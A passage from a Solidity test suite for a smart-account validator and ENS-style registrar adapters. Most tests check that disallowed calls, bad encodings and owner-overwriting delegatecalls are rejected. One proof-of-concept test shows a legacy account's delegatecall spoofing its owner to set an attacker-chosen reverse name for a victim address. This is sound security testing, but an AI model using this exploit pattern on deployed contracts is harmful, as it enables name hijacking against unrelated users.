            owner,
            resolver,
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, address(0))
            )
        );
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, address(0))
            )
        );
    }

    function test_validator_rejectsReverseClaimWithUndeployedResolver() public {
        address codelessResolver = makeAddr("codeless-resolver");
        _expectValidationRevert(
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, codelessResolver)
            ),
            codelessResolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_rejectsReverseClaimPolicyViolations() public {
        _expectValidationRevert(
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32("commitment"))
            ),
            resolver,
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, resolver)
            ),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, vm.addr(badKey), resolver)
            ),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                reverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(CLAIM_WITH_HCA_SELECTOR, owner, permittedResolverImpl)
            ),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_rejectsRegistrarImmediatelyAfterRoleRevocation() public {
        ethRegistry.revokeRootRoles(RegistryRolesLib.ROLE_REGISTRAR, ethRegistrar);
        bytes memory operationData =
            _singleOperationData(
                ethRegistrar,
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32("commitment"))
            );

        vm.expectRevert(
            abi.encodeWithSelector(
                HCAOwnerAndSessionValidator.ActionNotAllowed.selector,
                ethRegistrar,
                COMMIT_SELECTOR
            )
        );
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
    }

    function test_validator_rejectsApprovalAfterRegistrarRoleRevocation() public {
        ethRegistry.revokeRootRoles(RegistryRolesLib.ROLE_REGISTRAR, ethRegistrar);
        bytes memory operationData =
            _singleOperationData(
                usdc,
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, ethRegistrar, 1 ether)
            );

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
    }

    function test_validator_acceptsApprovalOfAnyOracleListedToken() public {
        address newToken = makeAddr("new-payment-token");
        address[] memory tokens = new address[](1);
        tokens[0] = newToken;
        address newRegistrar = _deployRegistrarWithOracle(tokens);
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTRAR, newRegistrar);

        bytes memory operationData =
            _singleOperationData(
                newToken,
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, newRegistrar, 1 ether)
            );

        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
    }

    function test_validator_rejectsApprovalOfTokenNotListedByRegistrarOracle() public {
        bytes memory operationData =
            _singleOperationData(
                makeAddr("junk-token"),
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, ethRegistrar, 1 ether)
            );

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
    }

    function test_validator_rejectsApprovalWhenRegistrarExposesNoOracle() public {
        address oracleLessRegistrar = makeAddr("oracle-less-registrar");
        ethRegistry.grantRootRoles(RegistryRolesLib.ROLE_REGISTRAR, oracleLessRegistrar);

        bytes memory operationData =
            _singleOperationData(
                usdc,
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, oracleLessRegistrar, 1 ether)
            );

        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
    }

    function test_validator_checksIntentTokenAgainstSingleBatchRegistrarOracle() public {
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallDataForLabel(
            "alice",
            owner,
            resolver
        )});
        executions[1] = Execution({target: ethRegistrar, value: 0, callData: _registerCallDataForLabel(
            "bob",
            owner,
            resolver
        )});
        bytes memory registerBatch = _operationData(executions);
        address rentPriceOracle = address(IRentPriceOracleProvider(ethRegistrar).rentPriceOracle());
        assertFalse(
            validatorHarness.isBatchRegistrarPaymentTokenHarness(
                registerBatch,
                makeAddr("junk-token")
            )
        );

        executions[1].target = _deployRegistrarWithOracle(_defaultPaymentTokens());
        assertFalse(
            validatorHarness.isBatchRegistrarPaymentTokenHarness(_operationData(executions), usdc)
        );

        bytes memory commitBatch =
            _singleOperationData(
                ethRegistrar,
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32("commitment"))
            );
        assertTrue(
            validatorHarness.isBatchRegistrarPaymentTokenHarness(commitBatch, makeAddr("junk-token"))
        );

        assertFalse(validatorHarness.isBatchRegistrarPaymentTokenHarness(hex"", usdc));

        vm.expectCall(
            ethRegistrar,
            abi.encodeWithSelector(IRentPriceOracleProvider.rentPriceOracle.selector),
            1
        );
        vm.expectCall(
            rentPriceOracle,
            abi.encodeWithSelector(IRentPriceOracle.isPaymentToken.selector, usdc),
            1
        );
        assertTrue(validatorHarness.isBatchRegistrarPaymentTokenHarness(registerBatch, usdc));
    }

    function test_validator_treatsUnresponsiveRegistrarOracleAsUnsupported() public {
        bytes memory operationData =
            _singleOperationData(
                usdc,
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, ethRegistrar, 1 ether)
            );
        bytes4 oracleGetter = IRentPriceOracleProvider.rentPriceOracle.selector;

        vm.mockCallRevert(ethRegistrar, abi.encodeWithSelector(oracleGetter), "");
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
        vm.clearMockedCalls();

        vm.mockCall(
            ethRegistrar,
            abi.encodeWithSelector(oracleGetter),
            abi.encode(makeAddr("codeless-oracle"))
        );
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
        vm.clearMockedCalls();

        address oracle = address(IRentPriceOracleProvider(ethRegistrar).rentPriceOracle());
        vm.mockCallRevert(
            oracle,
            abi.encodeWithSelector(IRentPriceOracle.isPaymentToken.selector),
            ""
        );
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationPolicyHarness(
            address(hca),
            owner,
            address(0),
            operationData
        );
        vm.clearMockedCalls();
    }

    function test_validator_rejectsUnapprovedRegistrarTarget() public {
        address unapprovedRegistrar = makeAddr("unapproved-registrar");
        bytes memory operationData =
            _singleOperationData(unapprovedRegistrar, 0, _registerCallData(owner, resolver));

        vm.expectRevert(
            abi.encodeWithSelector(
                HCAOwnerAndSessionValidator.ActionNotAllowed.selector,
                unapprovedRegistrar,
                REGISTER_SELECTOR
            )
        );
        validatorHarness.checkRegistrationPolicyHarness(address(hca), owner, resolver, operationData);
    }

    function test_validator_rejectsPolicyViolations() public {
        bytes memory operationData = _registrationOperationData(owner, otherResolver);
        _expectValidationRevert(
            operationData,
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        Execution[] memory executions = new Execution[](1);
        executions[0] = Execution({target: ethRegistrar, value: 1, callData: abi.encodeWithSelector(
            COMMIT_SELECTOR,
            bytes32("commitment")
        )});
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        validatorHarness.checkRegistrationExecutionsHarness(
            address(hca),
            owner,
            address(0),
            executions
        );
    }

    function test_validator_rejectsRegistrationPolicyArgumentFailures() public {
        _expectValidationRevert(
            _registrationOperationData(vm.addr(badKey), resolver),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _registrationOperationData(owner, address(0)),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _registrationOperationData(owner, resolver),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            resolver
        )});
        executions[1] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            otherResolver
        )});

        _expectValidationRevert(
            _operationData(executions),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );

        executions[0] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            address(0)
        )});
        executions[1] = Execution({target: ethRegistrar, value: 0, callData: _registerCallData(
            owner,
            resolver
        )});

        _expectValidationRevert(
            _operationData(executions),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
    }

    function test_validator_rejectsTargetPolicyFailures() public {
        _expectValidationRevert(
            _singleOperationData(
                ethRegistrar,
                0,
                abi.encodeCall(
                    IAddressSetter.setAddress,
                    (NAME, COIN_TYPE_ETH, abi.encodePacked(owner))
                )
            ),
            address(0),
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                ethRegistrar,
                0,
                abi.encodeWithSelector(RENEW_SELECTOR, "alice", uint64(365 days), usdc, bytes32(0))
            ),
            address(0),
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                defaultReverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32("commitment"))
            ),
            resolver,
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                defaultReverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(SET_NAME_WITH_HCA_SELECTOR, owner, "alice.eth")
            ),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                defaultReverseRegistrarHCAAdapter,
                0,
                abi.encodeWithSelector(SET_NAME_WITH_HCA_SELECTOR, vm.addr(badKey), "alice.eth")
            ),
            resolver,
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(usdc, 0, abi.encodeWithSelector(COMMIT_SELECTOR, bytes32(0))),
            address(0),
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                dai,
                0,
                abi.encodeWithSelector(APPROVE_SELECTOR, defaultReverseRegistrarHCAAdapter, 1 ether)
            ),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                verifiableFactory,
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32(0))
            ),
            address(0),
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                verifiableFactory,
                0,
                abi.encodeWithSelector(DEPLOY_PROXY_SELECTOR, otherResolver, 123, "")
            ),
            address(0),
            HCAOwnerAndSessionValidator.PolicyRuleFailed.selector
        );
        _expectValidationRevert(
            _singleOperationData(
                makeAddr("unknown-target"),
                0,
                abi.encodeWithSelector(COMMIT_SELECTOR, bytes32(0))
            ),
            address(0),
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
        _expectValidationRevert(
            _singleOperationData(resolver, 0, abi.encodeWithSelector(COMMIT_SELECTOR, bytes32(0))),
            resolver,
            HCAOwnerAndSessionValidator.ActionNotAllowed.selector
        );
    }

    function test_validator_rejectsMalformedPolicyCalldata() public {
        _expectValidationRevert(
            _singleOperationData(ethRegistrar, 0, hex"1234"),
            address(0),
            HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector
        );
        _expectValidationRevert(
            _singleOperationData(usdc, 0, abi.encodePacked(APPROVE_SELECTOR)),
            address(0),
            HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector
        );
        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.callArgsHarness(hex"1234");
    }

    function test_validator_rejectsInvalidOperationEncoding() public {
        _expectValidationRevert(
            hex"0200",
            address(0),
            HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector
        );
        _expectValidationRevert(
            abi.encodePacked(bytes32(uint256(0x0205) << 240), abi.encode(new Execution[](0))),
            address(0),
            HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector
        );

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.singleChainDigestHarness(address(hca), 0, hex"");

        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidOperationEncoding.selector);
        validatorHarness.singleChainDigestHarness(
            address(hca),
            0,
            abi.encodePacked(bytes2(HCAOperationHashLib.ERC7579_ERC1271_MODE), uint8(1))
        );
    }

    function test_validator_moduleSurface() public view {
        assertTrue(validator.isModuleType(1));
        assertFalse(validator.isModuleType(2));
        assertTrue(validator.isInitialized(address(hca)));
    }

    function test_validator_validatesOwnerUserOperations() public {
        bytes32 userOpHash = keccak256("owner user operation");
        PackedUserOperation memory userOp;
        userOp.sender = address(hca);
        userOp.signature = _sign(ownerKey, userOpHash);

        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 0);

        userOp.signature = _signPersonal(ownerKey, userOpHash);
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 0);

        userOp.signature = _signRhinestoneMessage(ownerKey, userOpHash);
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 0);

        userOp.signature = _signV01(ownerKey, userOpHash);
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 0);

        userOp.signature = hex"1234";
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 1);

        userOp.signature = abi.encodePacked(bytes32(0), bytes32(0), uint8(29));
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 1);

        userOp.signature = abi.encodePacked(
            bytes32(uint256(1)),
            bytes32(type(uint256).max),
            uint8(27)
        );
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 1);

        userOp.signature = _sign(badKey, userOpHash);
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 1);

        userOp.sender = makeAddr("other-account");
        vm.prank(address(hca));
        assertEq(validator.validateUserOp(userOp, userOpHash), 1);
    }

    function test_standaloneSingleOwnerHCA_rejectsOwnerDelegatecallUserOp() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
        OwnerSlotWriter writer = new OwnerSlotWriter();
        bytes memory delegateCallData =
            abi.encodeCall(
                Nexus.execute,
                (
                    ModeLib.encode(
                        CALLTYPE_DELEGATECALL,
                        EXECTYPE_DEFAULT,
                        MODE_DEFAULT,
                        ModePayload.wrap(0)
                    ),
                    abi.encodePacked(
                        address(writer),
                        abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
                    )
                )
            );

        assertEq(_validateOwnerUserOp(account, delegateCallData, 0), 1);
        assertEq(account.owner(), owner);
    }

    function test_standaloneSingleOwnerHCA_rejectsExecuteUserOpDelegatecallIndirection() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
        OwnerSlotWriter writer = new OwnerSlotWriter();
        bytes memory innerCallData =
            abi.encodeCall(
                Nexus.execute,
                (
                    ModeLib.encode(
                        CALLTYPE_DELEGATECALL,
                        EXECTYPE_DEFAULT,
                        MODE_DEFAULT,
                        ModePayload.wrap(0)
                    ),
                    abi.encodePacked(
                        address(writer),
                        abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
                    )
                )
            );
        bytes memory wrappedCallData = abi.encodePacked(Nexus.executeUserOp.selector, innerCallData);

        assertEq(_validateOwnerUserOp(account, wrappedCallData, 0), 1);
        assertEq(account.owner(), owner);
    }

    function test_standaloneSingleOwnerHCA_handlesOwnerUserOpCallDataShapes() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);

        assertEq(_validateOwnerUserOp(account, hex"", 0), 0);
        assertEq(_validateOwnerUserOp(account, abi.encodePacked(Nexus.executeUserOp.selector), 0), 0);
        assertEq(
            _validateOwnerUserOp(
                account,
                abi.encodePacked(Nexus.executeUserOp.selector, Nexus.executeUserOp.selector),
                0
            ),
            1
        );
        assertEq(_validateOwnerUserOp(account, hex"deadbeef", 0), 0);
        assertEq(_validateOwnerUserOp(account, abi.encodePacked(Nexus.execute.selector), 0), 1);
    }

    function test_standaloneSingleOwnerHCA_rejectsDefaultExecutorDelegatecall() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
        OwnerSlotWriter writer = new OwnerSlotWriter();

        vm.expectRevert(
            abi.encodeWithSelector(
                IModuleManagerEventsAndErrors.InvalidModule.selector,
                address(this)
            )
        );
        account.executeFromExecutor(ModeLib.encodeSimpleSingle(), "");

        vm.expectRevert(StandaloneSingleOwnerHCA.DelegateCallNotAllowed.selector);
        vm.prank(address(defaultExecutor));
        account.executeFromExecutor(
            ModeLib.encode(
                CALLTYPE_DELEGATECALL,
                EXECTYPE_DEFAULT,
                MODE_DEFAULT,
                ModePayload.wrap(0)
            ),
            abi.encodePacked(
                address(writer),
                abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
            )
        );

        assertEq(account.owner(), owner);
    }

    function test_standaloneSingleOwnerHCA_allowsCallModes() public {
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
        WalletPaidTarget target = new WalletPaidTarget();

        vm.prank(address(defaultExecutor));
        account.executeFromExecutor(
            ModeLib.encodeSimpleSingle(),
            ExecLib.encodeSingle(address(target), 0, abi.encodeCall(WalletPaidTarget.setValue, (7)))
        );

        assertEq(target.value(), 7);
        assertTrue(account.supportsExecutionMode(ModeLib.encodeSimpleSingle()));
        assertFalse(
            account.supportsExecutionMode(
                ModeLib.encode(
                    CALLTYPE_DELEGATECALL,
                    EXECTYPE_DEFAULT,
                    MODE_DEFAULT,
                    ModePayload.wrap(0)
                )
            )
        );
    }

    function test_standaloneSingleOwnerHCA_deploysAndExecutesPaymasterSponsoredOwnerUserOp() public {
        EntryPoint userOpEntryPoint = new EntryPoint();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        VerifiableFactory factory = new VerifiableFactory();
        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
        StandaloneSingleOwnerHCA implementation =
            new StandaloneSingleOwnerHCA(
                address(userOpEntryPoint),
                address(validator),
                address(defaultExecutor),
                "",
                upgradeSet,
                IAddressSet(address(0)),
                deployer
            );
        deployer.setImplementationApproval(address(implementation), true);
        uint256 userSalt = 4337;
        uint256 deploymentSalt = deployer.deploymentSalt(owner, address(implementation), userSalt);
        bytes32 outerSalt = keccak256(abi.encode(address(deployer), deploymentSalt));
        address account =
            Create2.computeAddress(
                outerSalt,
                keccak256(CloneProxyBytecode.creationCode(factory.proxyLogic(), outerSalt)),
                address(factory)
            );
        assertEq(account.code.length, 0);

        TestPaymasterAcceptAll paymaster =
            new TestPaymasterAcceptAll(IEntryPoint(address(userOpEntryPoint)));
        vm.deal(address(this), 1 ether);
        paymaster.deposit{value: 1 ether}();

        WalletPaidTarget target = new WalletPaidTarget();
        PackedUserOperation memory userOp;
        userOp.sender = account;
        userOp.nonce = userOpEntryPoint.getNonce(account, uint192(0x123456) << 168);
        userOp.initCode = abi.encodePacked(
            address(deployer),
            abi.encodeCall(StandaloneHCAFactory.deploy, (owner, address(implementation), userSalt))
        );
        userOp.callData = abi.encodeCall(
            Nexus.execute,
            (
                ModeLib.encodeSimpleSingle(),
                ExecLib.encodeSingle(
                    address(target),
                    0,
                    abi.encodeCall(WalletPaidTarget.setValue, (4337))
                )
            )
        );
        userOp.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(1_000_000));
        userOp.preVerificationGas = 100_000;
        userOp.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));
        userOp.paymasterAndData = abi.encodePacked(
            address(paymaster),
            uint128(500_000),
            uint128(100_000)
        );
        userOp.signature = _signPersonal(ownerKey, userOpEntryPoint.getUserOpHash(userOp));

        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;
        uint256 paymasterDepositBefore = userOpEntryPoint.balanceOf(address(paymaster));

        vm.txGasPrice(1 gwei);
        userOpEntryPoint.handleOps(userOps, payable(makeAddr("bundler")));

        assertEq(target.value(), 4337);
        assertEq(StandaloneSingleOwnerHCA(payable(account)).owner(), owner);
        assertEq(factory.verifyContract(account), address(implementation));
        assertEq(account.balance, 0);
        assertLt(userOpEntryPoint.balanceOf(address(paymaster)), paymasterDepositBefore);
    }

    function test_standaloneSingleOwnerHCA_entryPointRejectsOwnerDelegatecallUserOp() public {
        EntryPoint userOpEntryPoint = new EntryPoint();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        VerifiableFactory factory = new VerifiableFactory();
        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
        StandaloneSingleOwnerHCA implementation =
            new StandaloneSingleOwnerHCA(
                address(userOpEntryPoint),
                address(validator),
                address(defaultExecutor),
                "",
                upgradeSet,
                IAddressSet(address(0)),
                deployer
            );
        deployer.setImplementationApproval(address(implementation), true);
        StandaloneSingleOwnerHCA account =
            StandaloneSingleOwnerHCA(payable(deployer.deploy(owner, address(implementation), 4338)));
        OwnerSlotWriter writer = new OwnerSlotWriter();

        PackedUserOperation memory userOp;
        userOp.sender = address(account);
        userOp.nonce = userOpEntryPoint.getNonce(address(account), uint192(0x123457) << 168);
        userOp.callData = abi.encodeCall(
            Nexus.execute,
            (
                ModeLib.encode(
                    CALLTYPE_DELEGATECALL,
                    EXECTYPE_DEFAULT,
                    MODE_DEFAULT,
                    ModePayload.wrap(0)
                ),
                abi.encodePacked(
                    address(writer),
                    abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
                )
            )
        );
        userOp.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(1_000_000));
        userOp.preVerificationGas = 100_000;
        userOp.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));
        userOp.signature = _signPersonal(ownerKey, userOpEntryPoint.getUserOpHash(userOp));

        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;

        vm.deal(address(this), 1 ether);
        userOpEntryPoint.depositTo{value: 1 ether}(address(account));
        vm.txGasPrice(1 gwei);
        vm.expectRevert(
            abi.encodeWithSelector(IEntryPoint.FailedOp.selector, 0, "AA24 signature error")
        );
        userOpEntryPoint.handleOps(userOps, payable(makeAddr("bundler")));

        assertEq(account.owner(), owner);
        assertEq(factory.verifyContract(address(account)), address(implementation));
    }

    function test_poc_legacyStandaloneHCA_delegatecallSpoofsOwnerAndNamesVictim() public {
        EntryPoint userOpEntryPoint = new EntryPoint();
        LegacyDelegatecallHCA implementation =
            new LegacyDelegatecallHCA(address(userOpEntryPoint), address(validator));
        VerifiableFactory factory = new VerifiableFactory();
        IAddressSetApproval trustedHCASet = _deployPermissionedAddressSet(address(this));
        trustedHCASet.approve(address(implementation), true);
        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
        deployer.setImplementationApproval(address(implementation), true);
        LegacyDelegatecallHCA account =
            LegacyDelegatecallHCA(payable(deployer.deploy(owner, address(implementation), 4339)));
        DefaultReverseRegistrar defaultReverseRegistrar = new DefaultReverseRegistrar();
        ImplementationTrustOnlyDefaultAdapter defaultAdapter =
            new ImplementationTrustOnlyDefaultAdapter(
                defaultReverseRegistrar,
                factory,
                trustedHCASet
            );
        defaultReverseRegistrar.setController(address(defaultAdapter), true);
        OwnerSpoofingPayload payload = new OwnerSpoofingPayload();
        address victim = makeAddr("unrelated-victim");
        string memory attackerChosenName = "attacker.eth";

        PackedUserOperation memory userOp;
        userOp.sender = address(account);
        userOp.nonce = userOpEntryPoint.getNonce(address(account), uint192(0x123458) << 168);
        userOp.callData = abi.encodeCall(
            Nexus.execute,
            (
                ModeLib.encode(
                    CALLTYPE_DELEGATECALL,
                    EXECTYPE_DEFAULT,
                    MODE_DEFAULT,
                    ModePayload.wrap(0)
                ),
                abi.encodePacked(
                    address(payload),
                    abi.encodeCall(
                        OwnerSpoofingPayload.spoofOwnerAndSetName,
                        (ISetNameWithHCA(address(defaultAdapter)), victim, attackerChosenName)
                    )
                )
            )
        );
        userOp.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(1_000_000));
        userOp.preVerificationGas = 100_000;
        userOp.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));
        userOp.signature = _signPersonal(ownerKey, userOpEntryPoint.getUserOpHash(userOp));

        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;

        vm.deal(address(this), 1 ether);
        userOpEntryPoint.depositTo{value: 1 ether}(address(account));
        vm.txGasPrice(1 gwei);
        userOpEntryPoint.handleOps(userOps, payable(makeAddr("bundler")));

        assertEq(account.owner(), owner);
        assertEq(defaultReverseRegistrar.nameForAddr(victim), attackerChosenName);
        assertEq(defaultReverseRegistrar.nameForAddr(owner), "");
        assertEq(factory.verifyContract(address(account)), address(implementation));
    }

    function test_validator_installHooksAreNoops() public view {
        validator.onInstall("");
        validator.onUninstall("");
    }

    function _newOwnerValidatedAccount(MockExecutorModule defaultExecutor)
        internal
        returns (StandaloneSingleOwnerHCA account)
    {
        account = new StandaloneSingleOwnerHCA(
            entryPoint,
            address(validator),
            address(defaultExecutor),
            "",
            upgradeSet,
            IAddressSet(address(0)),
            IStandaloneHCAFactory(address(0))
        );
        account.initializeAccount(abi.encode(owner));
    }

    function _validateOwnerUserOp(
        StandaloneSingleOwnerHCA account,
        bytes memory callData,
        uint256 nonce
    )
        internal
        returns (uint256 validationData)
    {
        bytes32 userOpHash = keccak256(abi.encode(address(account), nonce, keccak256(callData)));
        PackedUserOperation memory userOp;
        userOp.sender = address(account);
        userOp.nonce = nonce;
        userOp.callData = callData;
        userOp.signature = _sign(ownerKey, userOpHash);

        vm.prank(entryPoint);
        return account.validateUserOp(userOp, userOpHash, 0);
    }

    function _newAccount() internal returns (StandaloneSingleOwnerHCA) {
        return _newAccount(IAddressSet(address(0)));
    }

    function _newAccount(IAddressSet predecessorUpgradeSet)
        internal
        returns (StandaloneSingleOwnerHCA)
    {
        MockValidatorModule defaultValidator = new MockValidatorModule();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        return
            new StandaloneSingleOwnerHCA(
                entryPoint,
                address(defaultValidator),
                address(defaultExecutor),
                "",
                upgradeSet,
                predecessorUpgradeSet,
                IStandaloneHCAFactory(address(0))
            );
    }

    function _newAccountHarness() internal returns (StandaloneSingleOwnerHCAHarness) {
        MockValidatorModule defaultValidator = new MockValidatorModule();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        return
            new StandaloneSingleOwnerHCAHarness(
                entryPoint,
                address(defaultValidator),
                address(defaultExecutor),
                "",
                upgradeSet,
                IAddressSet(address(0))
            );
    }

    function _deployPermissionedAddressSet(address rootAccount)
        internal
        returns (IAddressSetApproval)
    {
        return
            IAddressSetApproval(
                deployCode(PERMISSIONED_ADDRESS_SET_ARTIFACT, abi.encode(rootAccount))
            );
    }

    function _deployPermissionedResolver(address namer) internal returns (address) {
        return deployCode(PERMISSIONED_RESOLVER_ARTIFACT, abi.encode(namer));
    }

    function _defaultPaymentTokens() internal view returns (address[] memory tokens) {
        tokens = new address[](2);
        tokens[0] = usdc;
        tokens[1] = dai;
    }

    function _deployRegistrarWithOracle(address[] memory paymentTokens)
        internal
        returns (address registrar)
    {
        OraclePaymentRatio[] memory ratios = new OraclePaymentRatio[](paymentTokens.length);
        for (uint256 i; i < paymentTokens.length; ++i) {
            ratios[i] = OraclePaymentRatio(paymentTokens[i], 1, 1);
        }
        address oracle =
            deployCode(
                STANDARD_RENT_PRICE_ORACLE_ARTIFACT,
                abi.encode(
                    address(this),
                    new uint256[](1),
                    new OracleDiscountPoint[](0),
                    uint128(0),
                    uint256(0),
                    uint64(0),
                    uint64(0),
                    ratios
                )
            );
        return
            deployCode(
                ETH_REGISTRAR_ARTIFACT,
                abi.encode(
                    address(this),
                    address(ethRegistry),
                    address(this),
                    oracle,
                    uint64(90 days),
                    uint64(1 minutes),
                    uint64(1 days),
                    uint64(28 days)
                )
            );
    }

